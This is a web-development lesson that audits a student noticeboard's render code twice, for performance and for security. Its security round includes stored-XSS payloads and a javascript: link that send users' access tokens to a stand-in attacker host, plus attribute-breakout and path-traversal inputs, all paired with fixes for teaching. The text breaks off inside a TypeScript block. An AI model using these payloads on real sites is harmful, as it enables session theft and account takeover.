# Fast and Safe

Two audits of the same noticeboard.

**Prerequisites:** `fetch`, DOM manipulation, array methods, ES modules  
**Time:** about 75 minutes for the two audits and the exercises, plus the self-study task

---

## How this lesson works

The course teaches performance (5.1) and security (5.2) as two lessons with two vocabularies, two tool sets and two sets of examples. In day-to-day work they are two questions asked about the same line of code:

- **Performance:** what does this cost?
- **Security:** what does this let in?

So we are not going to tour the topics. We are going to write one small feature badly, then audit it twice - once with each question - and watch what happens.

The interesting result is not that both audits find problems. It is that they keep finding the **same** problem from opposite directions, that fixing one sometimes opens the other, and that in a few places the two goals genuinely disagree and you have to choose. That last category is the one nobody teaches, and it is the one you will actually meet.

The main thread is vanilla JavaScript. There are two folded TypeScript blocks near the end; they are optional.

---

## The feature

A student housing block has a noticeboard app. Residents post small ads. Anyone can read the board; you have to log in to post.

The API returns listings like this:

```js
const listings = [
  {
    id: "L-104",
    title: "Desk lamp, works",
    body: "Bulb included. Collect from block C, any evening.",
    price: 150,
    seller: "mari",
    image: "https://cdn.example.com/img/lamp.jpg",
    contact: "https://example.com/u/mari",
    posted: "2026-08-14"
  },
  {
    id: "L-105",
    title: "Bike, needs a new chain",
    body: "Frame is fine. Free to a good home.",
    price: 0,
    seller: "jonas",
    image: "https://cdn.example.com/img/bike.jpg",
    contact: "https://example.com/u/jonas",
    posted: "2026-08-15"
  }
];
```

Every one of those fields except `id` and `posted` was typed by a resident. Hold that thought.

Here is the render function. It works. It is on the board right now.

```js
// The naive version. Everything in this lesson comes out of these ten lines.
function render(listings) {
  const board = document.querySelector("#board");
  board.innerHTML = "";

  for (const listing of listings) {
    board.innerHTML += `
      <article class="card">
        <h2>${listing.title}</h2>
        <p>${listing.body}</p>
        <p class="price">${listing.price} kr</p>
        <img src="${listing.image}" alt="">
        <a href="${listing.contact}">Contact ${listing.seller}</a>
      </article>
    `;
  }
}
```

And the search box:

```js
const search = document.querySelector("#search");

search.addEventListener("input", () => {
  const term = search.value.toLowerCase();
  render(listings.filter((l) => l.title.toLowerCase().includes(term)));
});
```

Read both blocks again before you carry on. Everything below is an audit of exactly this code.

---

## Round 0: measure, do not guess

Before the performance audit, one rule. You are not allowed to optimise anything you have not measured, because your intuition about which line is slow is wrong roughly half the time.

You do not need a profiler for this. You need two lines:

```js
const t0 = performance.now();
render(listings);
console.log(`render: ${(performance.now() - t0).toFixed(1)} ms`);
```

And one counter, which is more revealing than the timing:

```js
let renderCount = 0;
// ...inside render()
renderCount += 1;
```

With 400 listings on the board, type "lamp" into the search box and look at the counter. It says **4**. Four full rebuilds of 400 cards for one word. Hold that thought too.

The course's own tool for 5.1 is Lighthouse, and it is worth running. But Lighthouse gives you a score, and a score tells you that something is wrong, not what. `performance.now()` and a counter tell you what.

---

## Round 1: the performance audit

### Finding 1: `innerHTML +=` inside a loop

This is the expensive line, and it is expensive in a way that is not obvious.

`board.innerHTML` is not a string that the browser keeps lying around. Reading it **serialises the entire subtree back into HTML text**. Assigning to it **throws away every existing child node and parses the whole string again from scratch**.

So `board.innerHTML += card` means: serialise everything already there, glue one card on the end, destroy everything already there, re-parse it all. On iteration 400 you are re-parsing 399 cards you already had. The work grows with the square of the number of listings.

There is a second cost that bites even harder in practice: every rebuild discards the previous `<img>` elements, so images that were halfway downloaded are thrown away and requested again. And any event listener you attached to a card is gone.

The fix is to build the nodes once, off-screen, and attach them in a single operation.

```js
function makeCard(listing) {
  const card = document.createElement("article");
  card.className = "card";

  const title = document.createElement("h2");
  title.textContent = listing.title;

  const body = document.createElement("p");
  body.textContent = listing.body;

  const price = document.createElement("p");
  price.className = "price";
  price.textContent = `${listing.price} kr`;

  const image = document.createElement("img");
  image.src = listing.image;
  image.alt = "";
  image.loading = "lazy";
  image.width = 320;
  image.height = 200;

  const contact = document.createElement("a");
  contact.href = listing.contact;
  contact.textContent = `Contact ${listing.seller}`;

  card.append(title, body, price, image, contact);
  return card;
}

function render(listings) {
  const board = document.querySelector("#board");
  const fragment = document.createDocumentFragment();

  for (const listing of listings) {
    fragment.append(makeCard(listing));
  }

  // One DOM mutation instead of 400
  board.replaceChildren(fragment);
}
```

A `DocumentFragment` is a container that is not in the document. Appending to it costs nothing in layout terms, because nothing that is not in the document can trigger layout. When you pass the fragment to `replaceChildren`, its children move into the board in one go, and the browser recalculates style and layout once.

Two small things in `makeCard` that are doing more work than they look:

- **`image.width` and `image.height`.** Without them the browser does not know how tall the card is until each image arrives, so the page reflows and jumps as they load. This is what Cumulative Layout Shift measures. Two attributes, and the reserved space is correct from the first paint.
- **`image.loading = "lazy"`.** Below-the-fold images are not requested until the user scrolls near them. This used to require `IntersectionObserver`; for plain images it does not any more.

`IntersectionObserver` is still the right tool when you need to know that an element has come into view for some reason other than loading an image: infinite scroll, "mark as read" when a message scrolls past, pausing an animation that is off-screen. Reach for the attribute first and the observer when the attribute cannot express what you want.

### Finding 2: four renders for one word

The search listener runs on every keystroke, and each run rebuilds the entire board. The user cares about the result after they stop typing, not after every letter.

```js
function debounce(fn, wait) {
  let timer;

  return (...args) => {
    clearTimeout(timer);
    timer = setTimeout(() => fn(...args), wait);
  };
}

const runSearch = debounce((term) => {
  render(listings.filter((l) => l.title.toLowerCase().includes(term)));
}, 250);

search.addEventListener("input", () => runSearch(search.value.toLowerCase()));
```

Now the counter says **1**.

The distinction worth keeping: **debounce waits for quiet, throttle enforces a maximum rate**. Search boxes and window resizing want debounce, because only the final state matters. Scroll position tracking and mouse-follow effects want throttle, because you need updates *during* the event, just fewer of them.

A detail that catches people out: the timer variable has to live outside the returned function. That is a closure, and it is the whole mechanism. If you declare `let timer` inside the returned function, every call gets a fresh one, `clearTimeout` never cancels anything, and the debounce silently does nothing at all.

### Finding 3: the map view nobody opens

The board has a "Show on map" button. The mapping library is 180 kB. Perhaps one resident in twenty clicks it, and the other nineteen download it on every visit as part of the bundle.

```js
const mapButton = document.querySelector("#showMap");

mapButton.addEventListener("click", async () => {
  mapButton.disabled = true;
  mapButton.textContent = "Loading map...";

  try {
    const { renderMap } = await import("./map-view.js");
    renderMap(document.querySelector("#mapPanel"), listings);
    mapButton.hidden = true;
  } catch (error) {
    console.error("Map failed to load:", error);
    mapButton.disabled = false;
    mapButton.textContent = "Show on map";
  }
});
```

`import()` is a function-like form that returns a promise for the module. The bundler sees it and splits `map-view.js` and its dependencies into a separate file, fetched on demand. Open the Network tab, click the button, and watch the request appear.

The pattern is: **the users who ask for a feature pay for it, and nobody else does.** The three lines of loading state are not decoration - a dynamic import over a bad connection is a visible wait, and a button that appears to do nothing gets clicked five more times.

### Finding 4: the statistics panel freezes the page

The board can show price statistics, and one of them is a duplicate check that compares every listing to every other one. With 5000 listings that is 12.5 million comparisons. On the main thread the page locks solid for several seconds: no scrolling, no clicking, no spinner animating, because the spinner needs the same thread.

JavaScript is single-threaded. A Web Worker gives you a second one.

```js
// stats-worker.js - runs on its own thread, has no DOM at all
self.onmessage = (event) => {
  const listings = event.data;
  const duplicates = [];

  for (let i = 0; i < listings.length; i++) {
    for (let j = i + 1; j < listings.length; j++) {
      if (listings[i].title === listings[j].title) {
        duplicates.push([listings[i].id, listings[j].id]);
      }
    }
  }

  self.postMessage({ duplicates, checked: listings.length });
};
```

```js
// main.js
const statsWorker = new Worker("./stats-worker.js");
const statsPanel = document.querySelector("#stats");

document.querySelector("#runStats").addEventListener("click", () => {
  statsPanel.textContent = "Checking for duplicates...";
  statsWorker.postMessage(listings);
});

statsWorker.onmessage = (event) => {
  const { duplicates, checked } = event.data;
  statsPanel.textContent = `Checked ${checked} listings, found ${duplicates.length} duplicates.`;
};
```

The page stays responsive throughout. The spinner spins.

What a worker can and cannot do is worth learning properly, because it explains both when to use one and, later in this lesson, why it matters for security:

- **No DOM.** No `document`, no `window`, no touching the page. It can only send data back.
- **No `localStorage`.** That API is synchronous, and it is simply not exposed to workers. `fetch`, `IndexedDB` and the Cache API are.
- **Messages are copied, not shared.** `postMessage` runs the structured clone algorithm over your data. For 5000 small objects that copy is cheap. For a 50 MB array it is not, and you would use a transferable `ArrayBuffer` instead.

A worker is worth it for CPU-bound work: parsing large files, image processing, heavy loops, crypto. It is *not* worth it for waiting on the network - `fetch` is already asynchronous and never blocked the thread in the first place. Students reach for workers to "speed up API calls" surprisingly often. It does nothing.

### What the performance audit changed

| Finding | Fix |
|---|---|
| `innerHTML +=` in a loop | Build nodes, batch with a fragment, `replaceChildren` |
| Images with no dimensions | `width` and `height` attributes |
| All images loaded immediately | `loading="lazy"` |
| Render on every keystroke | Debounce, 250 ms |
| Map library in the main bundle | Dynamic `import()` on click |
| Duplicate check blocks the UI | Web Worker |

Now put the performance hat down.

---

## Round 2: the security audit

Same code. New question: what does this let in?

### Finding 1: five injection points in one template

Go back to the original render function and mark every position where a resident's text is pasted into HTML:

```js
board.innerHTML += `
  <article class="card">
    <h2>${listing.title}</h2>            <!-- 1: element content -->
    <p>${listing.body}</p>               <!-- 2: element content -->
    <p class="price">${listing.price} kr</p>
    <img src="${listing.image}" alt="">  <!-- 3: URL attribute -->
    <a href="${listing.contact}">        <!-- 4: URL attribute -->
      Contact ${listing.seller}          <!-- 5: element content -->
    </a>
  </article>
`;
```

Five. A template literal does not escape anything; it is string concatenation with better syntax. Whatever a resident typed becomes markup.

So a resident posts a listing with this title:

```
Free sofa <img src=x onerror="fetch('https://evil.example/steal?t='+localStorage.getItem('accessToken'))">
```

The board parses it as HTML. The image fails to load, `onerror` fires, and every single person who visits the board hands over their access token. That is stored XSS: the payload lives in the database and fires for every visitor, not just for someone who clicked a dodgy link.

Two things students consistently get wrong when they test this:

- **`<script>alert(1)</script>` does nothing.** Scripts inserted via `innerHTML` are not executed by the HTML parser. Students try that payload, see no alert, and conclude the code is safe. It is not. `<img src=x onerror=...>` works perfectly, and so do `<svg onload=...>`, `<iframe srcdoc=...>` and about a hundred others. Absence of an alert is not evidence of safety.
- **Blocking `<script>` is not a defence.** Any attempt to fix XSS by searching for dangerous strings is a losing game. The attacker has more time than you.

Now the punchline of this lesson. Look at the fix we already made:

```js
title.textContent = listing.title;
```

`textContent` sets **text**, not markup. There is no parser involved, so there is nothing to inject into. Injection points 1, 2 and 5 closed themselves the moment we fixed the performance problem. We were not thinking about security at all.

This is not a coincidence. `innerHTML` is expensive *because* it invokes the HTML parser, and it is dangerous *for the same reason*. One property, two audits, one verdict.

### Finding 2: the two the performance fix did not close

Points 3 and 4 are still open, because `createElement` did not make them safe:

```js
image.src = listing.image;
contact.href = listing.contact;
```

A resident sets their contact link to `javascript:fetch('https://evil.example/steal?t='+localStorage.getItem('accessToken'))`. Anyone clicking "Contact mari" runs it, on your origin, with your session.

Be precise about what is and is not exploitable here, because it matters:

- **`a.href` with a `javascript:` URL executes on click.** Live vulnerability.
- **`img.src` with a `javascript:` URL does not execute** in any current browser. It is still worth constraining, because an attacker-controlled `src` is a request to a server of their choosing, carrying your users' IP addresses and referrer, on every page view. That is a tracking beacon you are hosting for them.

Any attacker-controlled URL needs to be parsed and checked, not string-matched:

```js
// Returns a safe absolute URL, or an empty string if it is not acceptable
function safeUrl(value) {
  if (typeof value !== "string" || value.trim() === "") return "";

  try {
    const url = new URL(value, window.location.origin);
    return url.protocol === "https:" ? url.href : "";
  } catch {
    // new URL() throws on anything it cannot parse
    return "";
  }
}
```

```js
image.src = safeUrl(listing.image);
image.referrerPolicy = "no-referrer";

const href = safeUrl(listing.contact);
if (href) {
  contact.href = href;
}

// An <a> with no href is not a link, so a rejected URL degrades to plain text
// and the seller's name still shows. Nothing to click, nothing to run.
contact.textContent = `Contact ${listing.seller}`;
```

Note the shape of it. We are not looking for bad values, we are **allowing known-good ones**. `new URL()` does the parsing, and it handles two different classes of trick with the same three lines:

- **Anything that is a scheme gets normalised into one.** Case, surrounding whitespace and embedded control characters all disappear, so `jAvAsCrIpT:`, `java\nscript:` and `  javascript:` come back with protocol `javascript:` and fail the check together.
- **Anything that is not a recognisable scheme is resolved against your own origin.** A percent-encoded attempt such as `%6a%61vascript:alert(1)` is not a scheme at all, so it becomes a harmless path on your own site. `safeUrl` returns a non-empty string for it, and that is the right answer: nothing there can execute. If you test that payload and see a URL come back, the check has not failed.

Anything you write yourself with `startsWith` or a regex will miss a case from one of those classes, and you will not find out which one.

One thing this deliberately does allow: `//evil.example/x` resolves to `https://evil.example/x` and passes. That is by design, since a contact link is meant to point somewhere else. It is also why `referrerPolicy` is on the image rather than left to chance - the URL check controls what can *execute*, not who you are talking to.

The placeholder images in the self-study task demonstrate this in one click. `safeUrl` approves `https://picsum.photos/...`, and picsum then redirects to `fastly.picsum.photos`, so the bytes arrive from a host that never appeared in your data. A URL check validates the address you were handed, not where it forwards you.

### Finding 3: the token in `localStorage`

Every payload above ends with `localStorage.getItem('accessToken')`. That is not laziness on my part - it is where the token is, because Module 2 put it there.

`localStorage` is readable and writable by **any JavaScript running on your origin**. Not just your code: injected code, a compromised npm dependency, a browser extension with host permissions, a tag manager somebody added for analytics. There is no permission model. If a script runs, it can read the lot.

The usual alternative is a cookie set by the server:

```
Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax
```

- **`HttpOnly`** - JavaScript cannot read it. `document.cookie` does not see it, so the exfiltration payload above returns `null`.
- **`Secure`** - never sent over plain HTTP, so it cannot be read off a cafe wifi network.
- **`SameSite=Lax`** - not sent on most cross-site requests, which is the main defence against CSRF: an attacker's page cannot make the browser fire an authenticated `POST /listings/delete` at your API just because your user happens to be logged in.

Many write-ups stop there and declare cookies the winner. That is too quick, and the reason matters more than the conclusion.

**An `HttpOnly` cookie does not stop an attacker who is already running script on your page.** They cannot read the cookie, true. They do not need to. The browser attaches it automatically, so the injected script simply calls your API from your page, as the user, and does whatever it likes. What `HttpOnly` changes is the *shape* of the loss: the credential does not leave the browser, so the attacker cannot pocket it and use it from their own machine next Tuesday. That is a real improvement, and it is a narrowing of the blast radius rather than a fix.

Meanwhile the swap buys you a new problem. A credential the browser attaches on its own is attached no matter who caused the request, which is precisely what CSRF is. `SameSite` covers most of it, but "most" is now a word in your threat model that was not there before. A bearer token in an `Authorization` header has no CSRF exposure at all, because nothing attaches it but your own code.

**So the honest summary is:** there is no safe place to keep a session credential on a page that has XSS. Cookies and `localStorage` fail differently, and you are choosing which failure you would rather have, not whether to have one.

`localStorage` with a bearer token is a defensible choice, and it is the right one for the work in front of you. It is what the Noroff API issues, it keeps CSRF off the table entirely, it works across origins without `credentials` and `Access-Control-Allow-Credentials` fights, and it keeps the auth logic visible in your own code rather than in headers you cannot see. What it costs you is that XSS becomes total. That is an acceptable price **only if you pay the premium**, and the premium is the rest of this lesson: `textContent` everywhere, every URL through `safeUrl`, no hand-rolled sanitisers.

Which is the point. The storage decision is downstream of the rendering decision. Get the rendering right and the storage argument mostly stops mattering; get it wrong and no storage mechanism saves you.

Write the reasoning down in your README either way: "the token is in `localStorage` because the API is bearer-token based and this keeps CSRF out of scope; the trade is that any XSS on this origin is total, so every rendering path uses `textContent` and every attacker-controlled URL is parsed before use." That sentence is worth more than a pile of defensive code, and it is exactly what the reflection document is asking for.

### Finding 4: what CORS actually does

Students meet CORS as an error message and conclude it is an obstacle. It is worth correcting this now, because the misunderstanding leads to genuinely bad decisions later.

CORS does not protect your server. Your server is reachable by anyone with `curl`, and no browser header changes that. **CORS protects your users' browsers from letting one site read another site's authenticated responses.** Without it, any page you visited could quietly `fetch` your bank's account page using your session and read the result.

The browser sends a **preflight** `OPTIONS` request before any request that is not "simple" - anything using `PUT`, `DELETE`, a custom header such as `Authorization`, or a JSON content type. That is a full extra round trip before your real request, and there is your performance overlap: a slow API on a distant server pays it on every call. The server can reduce it with `Access-Control-Max-Age`, which tells the browser to cache the preflight result.

The thing not to do is contort your API into "simple" requests to dodge the preflight. That usually means moving the token out of the `Authorization` header and into a query string, and query strings end up in server logs, browser history, referrer headers and analytics. You will have bought one round trip with a credential leak.

Server-side **rate limiting** belongs here too, and it is where the debounce comes back with a different verdict. Debouncing the search box means fewer API calls, which is a real benefit - but it is a courtesy, not a control. It runs on the attacker's machine, and they will simply delete it. Anything that must be enforced has to be enforced by the server.

### Finding 5: the worker, unexpectedly on your side

The Web Worker was a performance fix. It also happens to have a security property: **it has no DOM access at all**. Code running in a worker cannot inject into the page, cannot read `document.cookie` and cannot reach `localStorage`.

That does not make workers a sandbox for hostile code - a worker can still `fetch` your data out to any server it likes. But it does mean that if you must run something you only half-trust, such as a parser for a user-uploaded file, running it in a worker where its only route back is a `postMessage` is a meaningfully smaller blast radius than running it beside your DOM.

The direction of trust does reverse, though. Whatever the worker sends back arrives at your `onmessage` handler and usually goes straight into the page. Treat it exactly like an API response - which is to say, do not `innerHTML` it.

### Finding 6: dynamic import with a variable path

The map view was loaded like this:

```js
await import("./map-view.js");
```

Some time later somebody generalises it, so panels can be configured:

```js
// Do not do this
const panel = new URLSearchParams(location.search).get("panel");
await import(`./panels/${panel}.js`);
```

That path is now controlled by whoever writes the link. `?panel=../../../evil` is a starting point, and on a site that serves user uploads it can end in arbitrary code execution on your origin. The rule is the same shape as `safeUrl`: allow known-good values, do not filter bad ones.

```js
const PANELS = {
  map: () => import("./panels/map.js"),
  stats: () => import("./panels/stats.js")
};

// Object.hasOwn, not `if (PANELS[panel])`. A plain object inherits from
// Object.prototype, so PANELS["constructor"] is a function and
// PANELS["__proto__"] is an object - both truthy, neither yours.
if (Object.hasOwn(PANELS, panel)) {
  const module = await PANELS[panel]();
  module.render(container);
}
```

As a bonus, this version also code-splits properly, because a bundler can see two literal import paths and cannot see a template string.

That `Object.hasOwn` line is not pedantry. It is the same mistake as the allow-list itself, one level down: a truthiness check looks like a membership check and is not one. Anywhere you use an object as a lookup table for untrusted keys, either check ownership or build the table with `Object.create(null)`, which has no prototype to inherit from.

---

## The overlap table

This is the artefact worth keeping. One decision, two verdicts.

| Decision | Performance verdict | Security verdict |
|---|---|---|
| `innerHTML` with interpolated data | Slow: full parse, discards existing nodes | Dangerous: five injection points |
| `textContent` | Fast: no parser | Safe: no markup, nothing to inject |
| `createElement` plus `DocumentFragment` | One layout instead of N | Safe by construction for text |
| Setting `src` / `href` from data | Neutral | Unsafe until the URL is parsed and allowed |
| `width` and `height` on images | No layout shift | Neutral |
| `loading="lazy"` | Fewer requests up front | Neutral (add `referrerpolicy` for third parties) |
| Debounced input | Fewer renders and fewer calls | Not a control. The server must rate limit |
| Dynamic `import()`, literal path | Smaller initial bundle | Neutral |
| Dynamic `import()`, variable path | Bundler cannot split it | Arbitrary module load |
| Web Worker | Main thread stays free | No DOM access, smaller blast radius |
| Token in `localStorage` | Cheap and synchronous | Readable by any script on the origin. No CSRF exposure |
| Token in an `HttpOnly` cookie | Attached automatically, no code needed | Unreadable by JavaScript, but rides along on any request. Adds CSRF |

Most rows point the same way. That is the useful thing to notice: **most of good front-end practice is one set of habits, not two.**

---

## Where the two audits disagree

The rows that point the same way are the easy ones. These are the ones you will argue about in a code review, and being able to name the trade-off is more valuable than knowing any single fix in this lesson.

**1. Caching authenticated responses.** Performance wants your service worker to cache API responses so the app opens instantly offline. Security wants nothing that is behind a login written to a shared disk cache, because the next person on that shared machine can read it. The resolution is not "cache everything" or "cache nothing" - it is that public data is cached and anything user-specific is marked `Cache-Control: no-store` and left alone.

**2. `innerHTML` is not always the wrong answer.** If a listing body is written in Markdown and must render as real HTML, `textContent` cannot do the job. You then owe the page a sanitiser - `DOMPurify` is the one to use, and writing your own is a genuinely bad idea. And for large batches, one `innerHTML` assignment on a *detached* element can beat hundreds of `createElement` calls. "Always use `textContent`" is a good habit and a slightly false rule. The true rule is: use `textContent` for text, and never hand-roll HTML sanitisation.

**3. Preflight avoidance.** Covered above: the round trip is real, and the usual way of dodging it leaks your credentials into logs. Set `Access-Control-Max-Age` instead.

**4. Useful errors.** Performance and debugging want detailed error messages and source maps in production. Security wants your stack traces, framework versions and internal paths kept off the client. Log the detail to your own service, show the user a reference number.

**5. Third-party images.** Lazy loading images from a CDN you do not control is a clear performance win and a quiet privacy cost: every load is a request to a third party carrying the user's IP and, by default, the page they were on. `referrerpolicy="no-referrer"` costs nothing and removes half of that.

---

## Exercises

Solutions are folded below each one. Write your answer first.

### Exercise 1: count the renders

Build a page with a `<div id="board">`, an `<input id="search">`, and 400 generated listings. Wire up the naive `render` and the naive search listener from the top of this lesson.

1. Add a render counter and a `performance.now()` timer. Type "lamp" and record both numbers.
2. Apply **only** the debounce. Record again.
3. Undo the debounce and apply **only** the fragment-based render. Record again.
4. Apply both. Record again.
5. Which single fix helped more, and why? Would your answer change with 20 listings instead of 400?

<details>
<summary><strong>Solution</strong></summary>

Approximate numbers on a mid-range laptop with 400 listings. Yours will differ, sometimes by a lot. The ranking will not.

| Version | Renders for "lamp" | Time per render |
|---|---|---|
| Naive | 4 | 90 - 200 ms |
| Debounce only | 1 | 90 - 200 ms |
| Fragment only | 4 | 3 - 6 ms |
| Both | 1 | 3 - 6 ms |

**Which helped more:** the fragment, by a wide margin. Debouncing divided the number of renders by four. The fragment divided the cost of each render by roughly thirty, because it removed quadratic re-parsing. Cutting the number of times you do an expensive thing is worth less than making the thing cheap.

**At 20 listings:** the answer flips, or rather it stops mattering. Twenty cards re-parsed four times is a few milliseconds and no user notices. The debounce still helps if each keystroke triggers a network request, since that cost does not shrink with the list. This is the whole argument for measuring: the same two fixes rank differently at different scales, and you cannot tell which case you are in by reading the code.

**Instrumentation:**

```js
let renderCount = 0;

function render(listings) {
  const t0 = performance.now();
  renderCount += 1;

  // ...body...

  console.log(`render #${renderCount}: ${(performance.now() - t0).toFixed(1)} ms`);
}
```

Generating the test data:

```js
const listings = Array.from({ length: 400 }, (_, i) => ({
  id: `L-${i}`,
  title: i % 7 === 0 ? `Desk lamp ${i}` : `Item ${i}`,
  body: "Collect from block C.",
  price: i * 3,
  seller: `user${i}`,
  image: `https://picsum.photos/seed/${i}/320/200`,
  contact: `https://example.com/u/user${i}`,
  posted: "2026-08-14"
}));
```

</details>

### Exercise 2: find all five, then rank them

Take the naive template from the top of this lesson. For each of the five interpolation points, answer three questions:

1. Is it exploitable as written? Give the payload, or explain why not.
2. Does switching to `createElement` plus `textContent` close it?
3. If not, what does?

Then rank the five by severity and justify your ordering in one sentence each.

<details>
<summary><strong>Solution</strong></summary>

| # | Position | Exploitable? | Closed by `textContent`? | What actually closes it |
|---|---|---|---|---|
| 1 | `<h2>${title}</h2>` | Yes. `<img src=x onerror=alert(1)>` | Yes | `title.textContent = listing.title` |
| 2 | `<p>${body}</p>` | Yes, same payload | Yes | `body.textContent = listing.body` |
| 3 | `<img src="${image}">` | Partly. `" onerror="alert(1)` breaks out of the attribute and runs. A `javascript:` URL in `src` does not run in current browsers | The breakout, yes. The attacker-chosen request, no | `safeUrl()` plus `referrerPolicy = "no-referrer"` |
| 4 | `<a href="${contact}">` | Yes. `javascript:...` executes on click, and `" onmouseover="...` breaks out of the attribute | The breakout, yes. The `javascript:` URL, no | `safeUrl()`, and drop the link if it fails |
| 5 | `Contact ${seller}` | Yes, same as 1 and 2 | Yes | `contact.textContent = ...` |

**Ranking, worst first:**

1. **Point 2, the body.** Longest field, least scrutinised, most room for a payload. Highest chance of surviving any naive length or content check.
2. **Point 4, the contact link.** The only one still live *after* the `createElement` rewrite, which is exactly why it is dangerous: the team believes it has fixed XSS and stops looking.
3. **Point 1, the title.** Same mechanism as the body but shorter and more visible, so a mangled-looking title is likelier to be noticed and reported.
4. **Point 5, the seller name.** Usually validated at registration, so an attacker has less freedom - but "usually" is doing a lot of work in that sentence, and it is worth checking rather than assuming.
5. **Point 3, the image URL.** No script execution in current browsers, so the impact is a tracking beacon and a broken image rather than account takeover. Real, but not the same class.

**The point of the ranking exercise:** the two the performance rewrite left open are the two that matter most in a codebase where someone has "already fixed the XSS". Fixes that close a class of bug by accident are wonderful, and they are also how you end up with a false sense of coverage.

</details>

### Exercise 3: move the token

The noticeboard currently authenticates like this:

```js
async function login(email, password) {
  const response = await fetch("https://api.example.com/auth/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email, password })
  });

  const { accessToken } = await response.json();
  localStorage.setItem("accessToken", accessToken);
}

async function createListing(listing) {
  return fetch("https://api.example.com/listings", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${localStorage.getItem("accessToken")}`
    },
    body: JSON.stringify(listing)
  });
}
```

The API team proposes switching to a `Secure; HttpOnly; SameSite=Lax` session cookie. You have been asked to cost the migration and recommend. Write the answers, not just the code:

1. Which lines of front-end code disappear?
2. Which line has to be added to every authenticated `fetch`?
3. What must the API add to its CORS response headers, and what value is now forbidden?
4. Which attack does this close, which does it open, and which does it leave exactly where it was?
5. The front end is on `noticeboard.example.com`, the API on `api.example.com`. Does `SameSite=Lax` work here? What about `SameSite=Strict`?
6. Now write the recommendation. Two paragraphs: the case for switching, and the case for staying on `localStorage`. Then pick one and say what would have to change for you to pick the other.

<details>
<summary><strong>Solution</strong></summary>

**1. What disappears.** Both `localStorage` calls, and the whole `Authorization` header. The browser stores the cookie and attaches it on its own. The front end no longer holds the credential anywhere, which also means logout must become an API call - there is nothing left on the client to delete.

**2. What is added.** `credentials: "include"` on every authenticated request. Without it the browser will not send a cross-origin cookie, and everything returns 401 with no visible reason.

```js
async function createListing(listing) {
  return fetch("https://api.example.com/listings", {
    method: "POST",
    credentials: "include",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(listing)
  });
}
```

**3. CORS.** The API must send `Access-Control-Allow-Credentials: true`, and `Access-Control-Allow-Origin` must now be the exact origin - `https://noticeboard.example.com`. The wildcard `*` is forbidden with credentialed requests, and the browser will reject the response outright. This trips up nearly everyone the first time, because the same header worked fine five minutes earlier.

**4. Traded attacks.** It **closes** token exfiltration: `HttpOnly` means an injected script cannot read the credential and post it to a server abroad, so the attacker cannot keep using the account after the user closes the tab. It **opens** CSRF, because a credential the browser attaches on its own is attached whoever caused the request - which is what `SameSite` and, for anything more sensitive, a CSRF token are for. And it **leaves untouched** the ability of an injected script to act as the user right now: the cookie rides along on every request your page makes, including the ones the attacker's code makes. If you wrote "it fixes XSS", read Finding 3 of the security round again.

**5. `SameSite` across subdomains.** `noticeboard.example.com` and `api.example.com` are different **origins** but the same **site**, because `SameSite` is evaluated against the registrable domain, `example.com`. So this is a same-site request and both `Lax` and `Strict` will send the cookie.

That is convenient and it is also the sting in the tail: `SameSite` gives you nothing against anything else hosted under `example.com`. If the university runs student pages on `pages.example.com`, any one of them can make credentialed requests to your API and `SameSite` will not stop it. On a different registrable domain, `Lax` would block the cross-site `POST` and allow a top-level `GET` navigation; `Strict` would block both, at the cost of the user appearing logged out when they follow a link in from elsewhere.

**6. The recommendation.** There is no single right answer, and an answer that does not name a cost is wrong whichever side it lands on.

*For switching:* the credential stops being exfiltratable, which caps the damage of an XSS at the length of the session rather than indefinitely. Logout becomes server-side and therefore actually revokes something. The front end stops handling a secret at all.

*For staying:* CSRF never enters the threat model, so `SameSite` edge cases, subdomain trust and CSRF tokens are all problems you do not have. It works unchanged against a third-party API, with no `credentials` and `Allow-Credentials` negotiation and no exact-origin header the API team has to maintain per deployment. The auth logic stays visible in your own code. And crucially it is what the API you are actually building against issues - a bearer token - so "switch to cookies" is not a decision the front end can make alone.

*A defensible pick:* stay on `localStorage`, and treat the rendering rules as non-negotiable rather than as best practice. What would change my mind: an API that offers cookie sessions natively, or a page that starts loading third-party scripts. The second one is the real trigger. The moment an analytics tag or an ad script runs on your origin, "no XSS" stops being something you can promise, and a credential you cannot read becomes worth the CSRF work.

</details>

---

## TypeScript notes

Optional. The main thread of this lesson is plain JavaScript, and nothing above needs types. These two blocks cover the places where types earn their keep in this particular code.

<details>
<summary><strong>Typing the DOM code</strong></summary>

```ts
interface Listing {
  id: string;
  title: string;
  body: string;
  price: number;
  seller: string;
  image: string;
  contact: string;
  posted: string;
}

// querySelector returns Element | null. The generic gives you the specific
// element type; the null still has to be dealt with.
const board = document.querySelector<HTMLDivElement>("#board");
if (!board) throw new Error("#board is missing from the page");

function makeCard(listing: Listing): HTMLElement {
  const card = document.createElement("article");

  const title = document.createElement("h2");
  title.textContent = listing.title;

  // createElement is overloaded by tag name, so `image` is HTMLImageElement
  // and `image.loadng = "lazy"` is a compile error rather than a silent no-op.
  const image = document.createElement("img");
  image.src = safeUrl(listing.image);
  image.loading = "lazy";

  card.append(title, image);
  return card;
}

// event.target is EventTarget | null, so `.value` does not exist on it yet
search.addEventListener("input", (event: Event) => {
  if (!(event.target instanceof HTMLInputElement)) return;
  runSearch(event.target.value.toLowerCase());
});
```

**What actually changes**

- `querySelector` returns `Element | null`. The generic parameter narrows the element type; the `null` is separate and you still have to handle it. This is a real bug class, not ceremony - a typo in a selector becomes a compile-time nudge instead of a runtime `Cannot read properties of null`.
- `createElement` is overloaded per tag name, which is why `image` gets `HTMLImageElement` with `src`, `loading` and `referrerPolicy` on it. Property typos become errors.
- `event.target` is `EventTarget | null`. Narrowing with `instanceof` is the idiomatic fix and is worth the three characters over a cast, because a cast would lie if the handler were ever attached elsewhere.
- Typing `debounce` generically is the one fiddly bit:

```ts
function debounce<A extends unknown[]>(fn: (...args: A) => void, wait: number) {
  let timer: ReturnType<typeof setTimeout>;
  return (...args: A) => {
    clearTimeout(timer);
    timer = setTimeout(() => fn(...args), wait);
  };
}
```

`ReturnType<typeof setTimeout>` rather than `number`, because the DOM types and the Node types disagree about what a timer id is, and hard-coding `number` breaks whichever one you are not currently in.

</details>

<details>
<summary><strong>Typing the worker boundary</strong></summary>

```ts
// shared/messages.ts - imported by both sides
export interface StatsRequest {
  listings: Listing[];
}

export interface StatsResponse {
  duplicates: Array<[string, string]>;
  checked: number;
}
```

```ts
// stats-worker.ts
import type { StatsRequest, StatsResponse } from "./shared/messages";

